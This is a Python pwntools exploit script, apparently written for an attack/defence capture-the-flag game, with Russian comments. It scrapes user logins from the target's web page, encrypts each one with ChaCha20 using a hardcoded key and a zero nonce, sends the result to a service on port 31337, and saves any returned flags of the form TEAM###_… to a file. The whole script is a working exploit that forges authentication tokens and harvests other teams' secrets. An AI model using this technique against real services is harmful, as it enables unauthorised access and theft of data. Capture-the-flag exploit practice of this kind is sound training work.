from pwn import *
import re
from Crypto.Cipher import ChaCha20
import sys
import os
import requests
from bs4 import BeautifulSoup

HOST = sys.argv[1]
BASE_URL = f"http://{HOST}:9092/"
URL_LOGIN = f"http://{HOST}:9000/users"
PORT = 31337
NONCE = b'\x00' * 8               
KEY = bytes([
    0x54, 0x68, 0x65, 0x20, 0x71, 0x75, 0x69, 0x63,
    0x6B, 0x20, 0x62, 0x72, 0x6F, 0x77, 0x6E, 0x20,
    0x66, 0x6F, 0x78, 0x20, 0x6A, 0x75, 0x6D, 0x70,
    0x73, 0x20, 0x6F, 0x76, 0x65, 0x72, 0x20, 0x6C
    ])          
      
KEY_PATTERN = re.compile(rb"TEAM\d{3}_[A-Z0-9]{32}")
KEYS_FILE = "found_keys.txt"

def load_keys():
    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, "r") as f:
            return set(line.strip() for line in f)
    return set()

def save_key(key):
    with open(KEYS_FILE, "a") as f:
        f.write(key + "\n")

def encrypt_login(login: str) -> bytes:
    cipher = ChaCha20.new(key=KEY, nonce=NONCE)
    return cipher.encrypt(login.encode())

def send_and_receive(encrypted_login: bytes) -> bytes:
    conn = remote(HOST, PORT, timeout=10)
    conn.send(encrypted_login)
    response = conn.recv(timeout=5)  # Попробуем получить ответ
    conn.close()
    return response

def search_keys(data: bytes):
    return KEY_PATTERN.findall(data)

def find_logins():
    r = requests.get(URL_LOGIN, timeout=5)
    soup = BeautifulSoup(r.text, 'html.parser')
    return [li.text.strip() for li in soup.find_all("li")]

def main():
    set_key = load_keys()
    LOGINS = find_logins()
    context.log_level = 'error'  # Отключаем лишний вывод от pwntools
    
    for login in LOGINS:
        #print(f'[+] Проверка логина: {login}')
        encrypted = encrypt_login(login)
        response = send_and_receive(encrypted)

        if not response:
            print('Нет ответа или ошибка\n')
            continue

        keys = search_keys(response)
        if keys:
            for key in keys:
                key_str = key.decode()
                if not key_str in set_key:
                    #set_key.add(key_str)
                    save_key(key_str)
                    print(f'Найден ключ: {key_str}\n')
        else:
            print('Ключ не найден\n')

if __name__ == '__main__':
    main()
